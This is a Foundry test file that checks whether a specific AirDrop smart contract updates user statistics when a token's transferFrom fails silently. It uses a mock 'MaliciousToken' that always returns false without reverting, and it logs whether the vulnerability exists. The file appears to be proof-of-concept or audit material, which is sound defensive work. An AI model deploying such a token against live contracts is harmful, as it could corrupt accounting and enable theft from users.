// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa1fceeff3acc57d257b917e30c4df661401d6431.sol";

contract AirDrop_MissingReturnValueTest is Test {
    AirDropContract public airdrop;
    MaliciousToken public maliciousToken;
    address public constant RECIPIENT = address(0x123);

    function setUp() public {
        // Deploy contracts
        airdrop = new AirDropContract();
        maliciousToken = new MaliciousToken();
    }

    function test_transferMissingReturnValueCheck() public {
        address[] memory recipients = new address[](1);
        recipients[0] = RECIPIENT;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;

        console.log("--- BEFORE-Trigger State ---");
        (uint256 preAirdropCount, uint256 preTotalTokens) = airdrop.getUserStats(RECIPIENT);
        console.log("Pre-AirdropCount:", preAirdropCount);
        console.log("Pre-TotalTokens:", preTotalTokens);

        console.log("--- Trigger Transfer ---");
        airdrop.transfer(address(maliciousToken), recipients, amounts);

        console.log("--- AFTER-Trigger State ---");
        (uint256 postAirdropCount, uint256 postTotalTokens) = airdrop.getUserStats(RECIPIENT);
        console.log("Post-AirdropCount:", postAirdropCount);
        console.log("Post-TotalTokens:", postTotalTokens);

        // Check for state changes
        if (postAirdropCount != preAirdropCount || postTotalTokens != preTotalTokens) {
            console.log("Vulnerability Exists: Missing return value check in transferFrom allows state update on failure");
        } else {
            console.log("Vulnerability not Exist: Token transfer failure handled correctly");
        }
    }
}

contract MaliciousToken {
    function transferFrom(address, address, uint256) external returns (bool) {
        return false; // Always returns failure without reverting
    }
}